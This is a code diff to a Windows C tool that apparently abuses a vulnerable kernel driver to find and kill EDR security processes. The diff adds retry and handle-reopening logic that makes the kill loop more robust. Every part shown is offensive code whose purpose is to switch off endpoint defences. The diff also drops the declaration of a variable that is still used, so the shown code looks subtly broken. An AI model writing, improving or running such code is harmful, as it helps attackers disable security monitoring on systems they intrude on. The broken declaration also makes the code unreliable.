@@ -125,7 +125,7 @@ BOOL EnumerateEDRProcessesPID(OUT PPROCESS_ENTRY* ppProcessList, OUT DWORD* pdwP
 			for (DWORD i = 0; i < g_EDRCount; i++) {
 				if (_wcsicmp(pTemp->ImageName.Buffer, g_EDRNames[i]) == 0) {
 
-					// Only count if we haven’t seen this one before
+					// Only count if we haven't seen this one before
 					if (!pbSeen[i]) {
 						pbSeen[i] = TRUE;
 						dwCount++;
@@ -256,17 +256,28 @@ BOOL KillEdrProcesses() {
 
 	BOOL				bSTATE			= TRUE;
 	HANDLE				hDevice			= NULL;		// Stores handle to the device driver
-	BOOL				bIoctlSuccess	= NULL;		// Save the DeviceIOControl status
-	DWORD				dwPID			= NULL;		// Stores the EDR PID
 	HANDLE				hProcessHeap	= NULL;		// Handle to process heap
 	PPROCESS_ENTRY		pProcList		= NULL;		// Stores pointer to the custom process list struct
 	DWORD				dwProcCount		= 0;		// Stores the amount of processes
 	wsftprmKillBuffer	KillBuffer		= { 0 };	// Kill buffer which holds the PID and padding for the vulnerable driver
+	BOOL				bShouldReopenHandle = FALSE;
+	DWORD				dwHandleAttempt = 0;
 
 	// Open a handle to the vulnerable driver using symbolik link
-	hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
+	for (dwHandleAttempt = 0; dwHandleAttempt < g_DEVICEHANDLE_RETRY_COUNT && hDevice == NULL; dwHandleAttempt++) {
+		hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
+		if (hDevice != NULL) {
+			break;
+		}
+
+		info("GetDeviceHandle - Attempt %u/%u failed, retrying in %u ms",
+			(unsigned int)(dwHandleAttempt + 1),
+			(unsigned int)g_DEVICEHANDLE_RETRY_COUNT,
+			(unsigned int)g_DEVICEHANDLE_RETRY_DELAY);
+		Sleep(g_DEVICEHANDLE_RETRY_DELAY);
+	}
 	if (hDevice == NULL) {
-		error("GetDeviceHandle - Failed");
+		error("GetDeviceHandle - Unable to open device handle after retries");
 		bSTATE = FALSE;
 		goto _cleanUp;
 	}
@@ -323,7 +334,11 @@ BOOL KillEdrProcesses() {
 					NULL
 				);
 				if (!bIoctlSuccess) {
-					infoW_t("[-] DeviceIoControl - Failed to kill process \"%ws\" with PID %d", pProcList[i].pwszName, pProcList[i].dwPid);
+					DWORD dwErr = GetLastError();
+					infoW_t("[-] DeviceIoControl - Failed to kill process \"%ws\" with PID %d (err=%lu)", pProcList[i].pwszName, pProcList[i].dwPid, dwErr);
+					if (dwErr == ERROR_INVALID_HANDLE || dwErr == ERROR_FILE_NOT_FOUND || dwErr == ERROR_DEVICE_NOT_CONNECTED) {
+						bShouldReopenHandle = TRUE;
+					}
 				}
 				else {
 					infoW_t("DeviceIoControl - Killed process \"%ls\" with PID %d", pProcList[i].pwszName, pProcList[i].dwPid);
@@ -336,6 +351,35 @@ BOOL KillEdrProcesses() {
 			// Reset proclist
 			pProcList = NULL;
 			dwProcCount = 0;
+		}
+
+		if (bShouldReopenHandle) {
+			if (hDevice) {
+				CloseHandle(hDevice);
+				hDevice = NULL;
+			}
+
+			for (dwHandleAttempt = 0; dwHandleAttempt < g_DEVICEHANDLE_RETRY_COUNT && hDevice == NULL; dwHandleAttempt++) {
+				hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
+				if (hDevice != NULL) {
+					info("GetDeviceHandle - Reopened device handle after failure");
+					break;
+				}
+
+				info("GetDeviceHandle - Retry %u/%u failed, waiting %u ms",
+					(unsigned int)(dwHandleAttempt + 1),
+					(unsigned int)g_DEVICEHANDLE_RETRY_COUNT,
+					(unsigned int)g_DEVICEHANDLE_RETRY_DELAY);
+				Sleep(g_DEVICEHANDLE_RETRY_DELAY);
+			}
+
+			if (hDevice == NULL) {
+				error("GetDeviceHandle - Unable to recover device handle, exiting loop");
+				bSTATE = FALSE;
+				break;
+			}
+
+			bShouldReopenHandle = FALSE;
 		}
 
 		printf("[!] Press 'q' to exit the loop\n");
